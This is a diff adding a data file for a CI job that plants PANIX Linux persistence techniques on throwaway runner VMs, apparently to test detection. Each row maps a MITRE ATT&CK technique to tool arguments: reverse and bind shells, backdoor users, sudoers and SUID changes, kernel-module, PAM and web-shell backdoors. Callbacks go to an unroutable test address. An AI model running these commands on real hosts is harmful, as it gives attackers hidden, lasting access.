@@ -1,0 +1,36 @@
+# PANIX techniques planted by the `panix` CI job, one fresh runner VM each.
+# PANIX is pinned to the commit in tools/panix/PANIX_COMMIT. Every callback
+# uses TEST-NET-1 (192.0.2.1, RFC 5737), which is never routed; listeners bind
+# on the runner only. {IP}, {PORT} and {PUBKEY} are filled in by run_one.sh.
+# id	attack	panix arguments
+at	T1053.002	--at --default --ip {IP} --port {PORT} --time "now + 10 hours"
+authorized-keys	T1098.004	--authorized-keys --default --key "{PUBKEY}"
+backdoor-user	T1136.001	--backdoor-user --username panixbd
+backdoor-system-user	T1098.004	--backdoor-system-user --default --key "{PUBKEY}"
+bind-shell	T1059.004	--bind-shell --default --lolbin --nc --port {PORT}
+cap	T1548	--cap --default
+create-user	T1136.001	--create-user --username panixnew --password Panix-Test-1
+cron	T1053.003	--cron --default --ip {IP} --port {PORT}
+dbus	T1543	--dbus --default --ip {IP} --port {PORT}
+generator	T1543.002	--generator --ip {IP} --port {PORT}
+git	T1546	--git --default --ip {IP} --port {PORT} --hook
+initd	T1037	--initd --default --ip {IP} --port {PORT}
+ld-preload	T1574.006	--ld-preload --ip {IP} --port {PORT} --binary /usr/bin/whoami
+lkm	T1547.006	--lkm --default --ip {IP} --port {PORT}
+malicious-package	T1546.016	--malicious-package --ip {IP} --port {PORT} --dpkg
+motd	T1037	--motd --default --ip {IP} --port {PORT}
+network-manager	T1546	--network-manager --default --ip {IP} --port {PORT}
+package-manager	T1546.016	--package-manager --ip {IP} --port {PORT} --apt
+pam-exec	T1556.003	--pam --pam-exec --backdoor --ip {IP} --port {PORT}
+passwd-user	T1098	--passwd-user --default --username panixpw --password Panix-Test-1
+polkit	T1556	--polkit
+rc-local	T1037.004	--rc-local --default --ip {IP} --port {PORT}
+reverse-shell	T1059.004	--reverse-shell --ip {IP} --port {PORT} --mechanism sh-udp
+shell-profile	T1546.004	--shell-profile --default --ip {IP} --port {PORT}
+ssh-key	T1098.004	--ssh-key --default
+sudoers	T1548.003	--sudoers --username nobody
+suid	T1548.001	--suid --default
+system-binary	T1554	--system-binary --default --ip {IP} --port {PORT} --warning
+udev	T1546.017	--udev --default --ip {IP} --port {PORT} --systemd
+web-shell	T1505.003	--web-shell --port 8080 --language python --mechanism cmd
+xdg	T1547.013	--xdg --default --ip {IP} --port {PORT}
